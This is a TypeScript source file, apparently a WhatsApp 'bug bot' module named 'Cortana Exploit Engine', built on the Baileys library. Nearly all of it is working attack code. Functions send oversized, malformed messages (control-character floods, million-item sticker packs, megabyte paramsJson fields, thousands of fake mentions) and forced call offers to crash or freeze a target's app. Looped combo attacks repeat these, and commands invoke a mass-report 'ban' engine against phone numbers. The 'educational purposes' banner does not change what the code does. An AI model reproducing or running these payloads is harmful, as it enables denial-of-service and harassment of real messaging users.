/**
 * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
 * â•‘                        CORTANA EXPLOIT ENGINE v2.0                        â•‘
 * â•‘               New Stronger Bug Functions - Death Edition                   â•‘
 * â•‘                     For Educational Purposes Only                          â•‘
 * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 */

import { generateWAMessageFromContent, proto } from '@whiskeysockets/baileys';
import * as crypto from 'crypto';
import { doomsdayEngine } from './ban-engine';

// Simple colored logging
const log = {
    red: (msg: string) => console.log(`\x1b[31m${msg}\x1b[0m`),
    green: (msg: string) => console.log(`\x1b[32m${msg}\x1b[0m`),
    yellow: (msg: string) => console.log(`\x1b[33m${msg}\x1b[0m`),
    blue: (msg: string) => console.log(`\x1b[34m${msg}\x1b[0m`),
};

// Helper: Delay function
const sleep = (ms: number) => new Promise(r => setTimeout(r, ms));

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// CORE BUG PAYLOADS - CORTANA BUG BASE v1.0
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/**
 * BUG: LocaInvis (CORTANA IVIS)
 * Type: Location Message Overflow
 */
async function LocaInvis(sock: any, target: string) {
    try {
        const msgContent = {
            viewOnceMessage: {
                message: {
                    ephemeralMessage: {
                        message: {
                            interactiveMessage: {
                                header: {
                                    title: "ğŸ.ğŸ.ğŸ.ğŸ# ğ’ğšğ¯ğ" + "\u202E".repeat(800) + "\uDBFF\uDFFF".repeat(1500),
                                    hasMediaAttachment: false,
                                    locationMessage: {
                                        degreesLatitude: 992.999999,
                                        degreesLongitude: -932.8889989,
                                        name: "\u900A" + "\u0000".repeat(8000) + "\uFFFF".repeat(3000),
                                        address: "\u0007".repeat(30000) + "ê§”ê§ˆ".repeat(8000) + "\u2060".repeat(2000),
                                    },
                                },
                                body: {
                                    text: " Are you safe?" + "\u0003".repeat(15000) + "ê§”ê§ˆ".repeat(3000)
                                },
                                contextInfo: {
                                    remoteJid: target,
                                    participant: "0@s.whatsapp.net",
                                    stanzaId: "1234567890ABCDEF",
                                    forwardingScore: 99999,
                                    isForwarded: true,
                                    businessMessageForwardInfo: {
                                        businessOwnerJid: "13135550002@s.whatsapp.net"
                                    },
                                    mentionedJid: [
                                        target,
                                        "1@s.whatsapp.net",
                                        "0@s.whatsapp.net",
                                        ...Array.from({ length: 2000 }, () =>
                                            `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
                                        )
                                    ]
                                }
                            }
                        }
                    }
                }
            }
        };

        const msg = generateWAMessageFromContent(target, msgContent, { userJid: target });

        await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                        }
                    ]
                }
            ]
        });

        log.green(`[LocaInvis] âœ“ Sent to ${target}`);
    } catch (err: any) {
        log.red(`[LocaInvis] âœ— Error: ${err.message}`);
    }
}

/**
 * BUG: StickerBlankX10 (CORTANA BLANK)
 * Type: Sticker Pack Overflow
 */
async function StickerBlankX10(sock: any, target: string) {
    log.blue(`[StickerBlankX10] Processing send to ${target}`);

    try {
        const blankmsg = {
            groupInviteMessage: {
                groupJid: "120363347113453659@g.us",
                inviteCode: "",
                inviteExpiration: Date.now(),
                groupName: "./ğ’šğ˜¢ğ™£ğ˜¯/ğ™­10" + "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†Øƒ".repeat(20000),
                caption: "X10" + "áŸ„áŸ".repeat(15000),
                jpegThumbnail: null,
            },
            messageContextInfo: {
                ephemeralExpiration: 5,
                timeStamp: Date.now(),
            }
        };

        const msg = generateWAMessageFromContent(target, blankmsg, {});

        const msg2 = {
            stickerPackMessage: {
                stickerPackId: "X10",
                name: "./ğ’šğ˜¢ğ™£ğ˜¯/ğ™­10" + "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†Øƒ".repeat(15000),
                publisher: "./ğ’šğ˜¢ğ™£ğ˜¯/ğ™­10" + "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†Øƒ".repeat(15000),
                stickers: [
                    { fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp", isAnimated: false, emojis: ["ğŸ€„"], accessibilityLabel: "x10", isLottie: true, mimetype: "application/pdf" },
                    { fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp", isAnimated: false, emojis: ["ğŸ€„"], accessibilityLabel: "x10", isLottie: true, mimetype: "application/pdf" },
                    { fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp", isAnimated: false, emojis: ["ğŸ€„"], accessibilityLabel: "x10", isLottie: true, mimetype: "application/pdf" },
                    { fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp", isAnimated: false, emojis: ["ğŸ€„"], accessibilityLabel: "x10", isLottie: true, mimetype: "application/pdf" },
                    { fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp", isAnimated: false, emojis: ["ğŸ€„"], accessibilityLabel: "x10", isLottie: true, mimetype: "application/pdf" },
                ],
                fileLength: "999999999",
                fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
                fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
                mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
                directPath: "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc",
                packDescription: "./ğ’šğ˜¢ğ™£ğ˜¯/ğ™­10" + "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†Øƒ".repeat(15000),
                mediaKeyTimestamp: "1741150286",
                stickerPackSize: "9999999999999",
                stickerPackOrigin: "1",
            },
        };

        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: null,
            statusJidList: [target],
            additionalNodes: [
                { tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }
            ],
        });

        await sock.relayMessage("status@broadcast", msg2, {
            messageId: null,
            statusJidList: [target],
            additionalNodes: [
                { tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }
            ],
        });

        log.green(`[StickerBlankX10] âœ“ Sent to ${target}`);
    } catch (error: any) {
        log.red(`[StickerBlankX10] âœ— Error: ${error.message}`);
    }
}

/**
 * BUG: lottiePackV2 (CORTANA LOTTIE X10)
 * Type: Massive Lottie Sticker Pack Overflow
 */
async function lottiePackV2(sock: any, target: string) {
    const stickers: any[] = [];

    // Generate massive sticker array
    for (let y = 0; y < 1000000; y++) {
        const lottie = {
            fileName: "YHvA1PXb8Y5e2L8pCRjnut4n6DlSRdg9bXtl-op22nQ=.was",
            isAnimated: true,
            emojis: ["ğŸ”¥"],
            accessibilityLabel: "CORTANA_OVERFLOW",
            isLottie: true,
            mimetype: "application/was"
        };
        stickers.push({ lottie });
    }

    const msg = {
        stickerPackMessage: {
            stickerPackId: "4353f07f-0ddc-4f37-8864-7d5dde17fb06",
            name: "CORTANA | BugBase-Exploration",
            publisher: "",
            stickers: stickers,
            fileLength: "56800",
            fileSha256: "vEaL+n5DubWQBXuk/y4fY9rko0JIlhPOG7/3+kYay2o=",
            fileEncSha256: "Ui6ec+UryXswgCHp/ixzhlM96/I20hwE7EhyoLtTuto=",
            mediaKey: "OIB399e7ZKWQT+KMztghdKovvrKSXCjB9CwP0XQZgHM=",
            directPath: "/v/t62.15575-24/536718863_1457265171986689_8703320723734092471_n.enc",
            contextInfo: {
                isForwarded: true,
                forwardingScore: 999999,
                businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                participant: "13135550002@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: [
                    target,
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 2500 }, () => "1" + Math.floor(Math.random() * 5000) + "@s.whatsapp.net")
                ],
                groupMentions: [{ groupJid: "123409292992@g.us", subject: "CORTANA BugBase" }],
            },
            mediaKeyTimestamp: "1755786037",
            stickerPackSize: "9999999999999999",
            stickerPackOrigin: "USER_CREATED"
        }
    };

    await sock.relayMessage(target, msg, {
        participant: { jid: target }
    });

    log.green(`[lottiePackV2] âœ“ Sent to ${target}`);
}

/**
 * BUG: Ultimate (XANDRO / CORTANA OVERNIGHT)
 * Type: Payment Request Overflow
 */
async function Ultimate(sock: any, isTarget: string) {
    const payload = {
        requestPaymentMessage: {
            amount: {
                value: 1,
                offset: 0,
                currencyCodeIso4217: "IDR",
                requestFrom: isTarget,
                expiryTimestamp: Date.now() + 8000
            },
            contextInfo: {
                externalAdReply: {
                    title: "âƒŸê™° âŒ ğ‚ğğ‘ğ“ğ€ğğ€ â†¯ ğğ”ğ†ğğ€ğ’ğ„ âŒ",
                    body: "á€¼".repeat(2000),
                    mimetype: "audio/mpeg",
                    caption: "á€¼".repeat(2000),
                    showAdAttribution: true,
                    sourceUrl: "https://github.com/cortana-bugbase",
                    thumbnailUrl: "https://files.catbox.moe/eqsjkd.jpg"
                }
            }
        }
    };

    await sock.relayMessage(isTarget, payload, {
        participant: { jid: isTarget },
        messageId: null,
        userJid: isTarget,
        quoted: null
    });

    log.green(`[Ultimate] âœ“ Sent to ${isTarget}`);
}

/**
 * BUG: Truenullv4 (NEW YEAR)
 * Type: Video + Interactive Overflow
 */
async function Truenullv4(sock: any, isTarget: string, ptcp: boolean = true) {
    const VidMessage = generateWAMessageFromContent(isTarget, {
        videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
            mimetype: "video/mp4",
            fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
            fileLength: "289511",
            seconds: 15,
            mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
            caption: "\n",
            height: 640,
            width: 640,
            fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
            directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
            mediaKeyTimestamp: "1743848703",
            contextInfo: {
                isSampled: true,
                participant: isTarget,
                mentionedJid: [
                    ...Array.from({ length: 2500 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"),
                ],
                remoteJid: "isTarget",
                forwardingScore: 100,
                isForwarded: true,
                stanzaId: "123456789ABCDEF",
                quotedMessage: {
                    businessMessageForwardInfo: {
                        businessOwnerJid: "0@s.whatsapp.net",
                    },
                },
            },
            streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        },
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
    });

    await sock.relayMessage(isTarget, {
        groupStatusMessageV2: { message: VidMessage.message },
    }, ptcp ? { messageId: VidMessage.key.id, participant: { jid: isTarget } } : { messageId: VidMessage.key.id });

    // Enhanced paramsJson payload
    const payload = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "X", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: "\x10".repeat(1500000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_request"
                },
            },
        },
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
    });

    await sock.relayMessage(isTarget, {
        groupStatusMessageV2: { message: payload.message },
    }, ptcp ? { messageId: payload.key.id, participant: { jid: isTarget } } : { messageId: payload.key.id });

    // Second payload
    const payload2 = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "\n", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1500000),
                        version: 3,
                    },
                    entryPointConversionSource: "call_permission_message"
                },
            },
        },
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
    });

    await sock.relayMessage(isTarget, {
        groupStatusMessageV2: { message: payload2.message },
    }, ptcp ? { messageId: payload2.key.id, participant: { jid: isTarget } } : { messageId: payload2.key.id });

    log.green(`[Truenullv4] âœ“ Sent to ${isTarget}`);
}

/**
 * BUG: R9XKillGc (CORTANA NUKE GC)
 * Type: Group Chat Kill
 */
async function R9XKillGc(sock: any, target: string, mention: boolean = false) {
    await sock.relayMessage(
        target,
        {
            requestPaymentMessage: {
                currencyCodeIso4217: null,
                requestFrom: "13135550202@s.whatsapp.net",
                expiryTimestamp: Date.now() + 8000,
                amount: {
                    value: null,
                    offset: null,
                    currencyCode: null
                }
            }
        },
        mention ? { participant: { jid: target } } : {}
    );

    log.green(`[R9XKillGc] âœ“ Sent to group ${target}`);
}

/**
 * BUG: ZhTForceVoice (CORTANA VOICE)
 * Type: Force Voice Call Node Injection
 */
async function ZhTForceVoice(sock: any, isTarget: string) {
    try {
        const { encodeSignedDeviceIdentity, jidDecode } = await import('@whiskeysockets/baileys');

        const deviceList = (
            await sock.getUSyncDevices([isTarget], false, false)
        ).map(({ user, device }: any) => `${user}:${device || ''}@s.whatsapp.net`);

        await sock.assertSessions(deviceList);

        const callNode = {
            tag: "call",
            attrs: {
                to: isTarget,
                id: sock.generateMessageTag(),
                from: sock.user.id
            },
            content: [
                {
                    tag: "offer",
                    attrs: {
                        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                        "call-creator": sock.user.id
                    },
                    content: [
                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                        { tag: "audio", attrs: { enc: "opus", rate: "48000" } },
                        { tag: "net", attrs: { medium: "3" } },
                        {
                            tag: "capability",
                            attrs: { ver: "1" },
                            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1, 255])
                        },
                        { tag: "encopt", attrs: { keygen: "2" } },
                    ]
                }
            ]
        };

        await sock.sendNode(callNode);
        log.green(`[ZhTForceVoice] âœ“ Call sent to ${isTarget}`);
    } catch (err: any) {
        log.red(`[ZhTForceVoice] âœ— Error: ${err.message}`);
    }
}

/**
 * BUG: TrueNull (NULL)
 * Type: Alternative Audio + Interactive Status
 */
async function TrueNull(sock: any, isTarget: string) {
    const module = {
        message: {
            ephemeralMessage: {
                message: {
                    audioMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
                        mimetype: "audio/mpeg",
                        fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
                        fileLength: 9999999999999999,
                        seconds: 99999999999999,
                        ptt: true,
                        mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
                        fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
                        directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
                        mediaKeyTimestamp: 999999999999999,
                        contextInfo: {
                            mentionedJid: [
                                "13300350@s.whatsapp.net",
                                isTarget,
                                ...Array.from({ length: 2500 }, () =>
                                    `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                                )
                            ],
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: "1@newsletter",
                                serverMessageId: 1,
                                newsletterName: "X"
                            }
                        },
                        waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
                    }
                }
            }
        }
    };

    const Content = generateWAMessageFromContent(
        isTarget,
        module.message,
        { userJid: isTarget }
    );

    await sock.relayMessage("status@broadcast", Content.message, {
        messageId: Content.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget } }
                        ]
                    }
                ]
            }
        ]
    });

    const viewOnceMsg = generateWAMessageFromContent(
        "status@broadcast",
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "X",
                            format: "BOLD"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0000".repeat(1500000),
                            version: 3
                        }
                    }
                }
            }
        },
        {}
    );

    await sock.relayMessage(
        "status@broadcast",
        viewOnceMsg.message,
        {
            messageId: viewOnceMsg.key.id,
            statusJidList: [isTarget]
        }
    );

    log.green(`[TrueNull] âœ“ Sent to ${isTarget}`);
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// COMBO / COMMAND SHORTCUTS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/**
 * COMMAND: cortana-combo
 * Use: Combo attack for maximum effect
 */
async function AllBugs(sock: any, target: string, loops: number = 50) {
    log.yellow(`[AllBugs] Starting attack on ${target} with ${loops} loops...`);

    for (let i = 0; i < loops; i++) {
        try {
            await StickerBlankX10(sock, target);
            await LocaInvis(sock, target);
            await lottiePackV2(sock, target);
            log.blue(`[AllBugs] Loop ${i + 1}/${loops} completed`);
        } catch (err: any) {
            log.red(`[AllBugs] Loop ${i + 1} failed: ${err.message}`);
        }
    }

    log.green(`[AllBugs] âœ“ Attack completed on ${target}`);
}

/**
 * COMMAND: edu-jammer
 * Use: Heavy delay with Truenullv4
 */
async function DelayHard(sock: any, target: string, loops: number = 50) {
    log.yellow(`[DelayHard] Starting on ${target}...`);

    for (let i = 0; i < loops; i++) {
        try {
            await Truenullv4(sock, target, true);
            await sleep(1000);
            await Truenullv4(sock, target, true);
            await sleep(1000);
            await Truenullv4(sock, target, true);
            await sleep(2000);
            log.blue(`[DelayHard] Loop ${i + 1}/${loops} completed`);
        } catch (err: any) {
            log.red(`[DelayHard] Loop ${i + 1} failed: ${err.message}`);
        }
    }

    log.green(`[DelayHard] âœ“ Completed on ${target}`);
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MAIN EXPORT: Execute Exploit
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
export async function executeExploit(sock: any, command: string, target: string) {
    // Validate target before doing anything
    if (!target || target.trim() === '' || target === 'null' || target === 'undefined') {
        log.yellow('âš ï¸ No target provided - exploit cancelled');
        return false;
    }

    const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;

    // Additional validation - must have a valid number
    const numberPart = jid.split('@')[0];
    if (!numberPart || numberPart.length < 6 || !/^[\d:]+$/.test(numberPart)) {
        log.yellow(`âš ï¸ Invalid target: ${numberPart} - exploit cancelled`);
        return false;
    }

    log.red(`â˜ ï¸ Executing ${command} on ${jid}`);

    try {
        switch (command.toLowerCase()) {
            // â•â•â•â•â•â•â• GROUP DEATH COMMANDS â•â•â•â•â•â•â•
            case 'cortana-nuke-gc':
                if (!jid.endsWith('@g.us')) {
                    log.yellow("âš ï¸ Target must be a group JID for nuke gc");
                    return false;
                }
                await R9XKillGc(sock, jid, true);
                break;

            // â•â•â•â•â•â•â• BUG COMMANDS â•â•â•â•â•â•â•
            case 'cortana-ivis':
                await LocaInvis(sock, jid);
                break;

            case 'cortana-blank':
                await StickerBlankX10(sock, jid);
                break;

            case 'cortana-lottie-x10':
                await lottiePackV2(sock, jid);
                break;

            case 'xandro':
            case 'cortana-overnight':
                await Ultimate(sock, jid);
                break;

            case 'new-year':
                await Truenullv4(sock, jid, true);
                break;

            case 'cortana-voice':
                await ZhTForceVoice(sock, jid);
                break;

            case 'null':
                await TrueNull(sock, jid);
                break;

            case 'cortana-combo':
                await AllBugs(sock, jid, 30);
                break;

            case 'edu-jammer':
                await DelayHard(sock, jid, 30);
                break;

            // â•â•â•â•â•â•â• BAN COMMANDS (DOOMSDAY ENGINE) â•â•â•â•â•â•â•
            case 'perm-ban-num':
                log.red(`â˜ ï¸ PERMANENT BAN STRIKE: ${jid}`);
                try {
                    const permResult = await doomsdayEngine.executePermanentBan(jid.replace('@s.whatsapp.net', ''));
                    log.green(`âœ… Ban probability: ${permResult.banProbability}%`);
                    log.green(`â±ï¸ Estimated ban time: ${permResult.estimatedBanTime}`);
                } catch (e) {
                    console.error('Perm ban error:', e);
                }
                break;

            case 'temp-ban-num':
                log.yellow(`âš ï¸ TEMPORARY BAN STRIKE: ${jid}`);
                try {
                    const tempResult = await doomsdayEngine.executeTemporaryBan(jid.replace('@s.whatsapp.net', ''));
                    log.green(`âœ… Ban probability: ${tempResult.banProbability}%`);
                    log.green(`â±ï¸ Estimated ban time: ${tempResult.estimatedBanTime}`);
                } catch (e) {
                    console.error('Temp ban error:', e);
                }
                break;

            default:
                log.yellow(`Unknown exploit command: ${command}`);
                return false;
        }

        log.green(`âœ… ${command} execution completed on ${jid}`);
        return true;
    } catch (error) {
        log.red('Exploit execution error:');
        console.error(error);
        return false;
    }
}
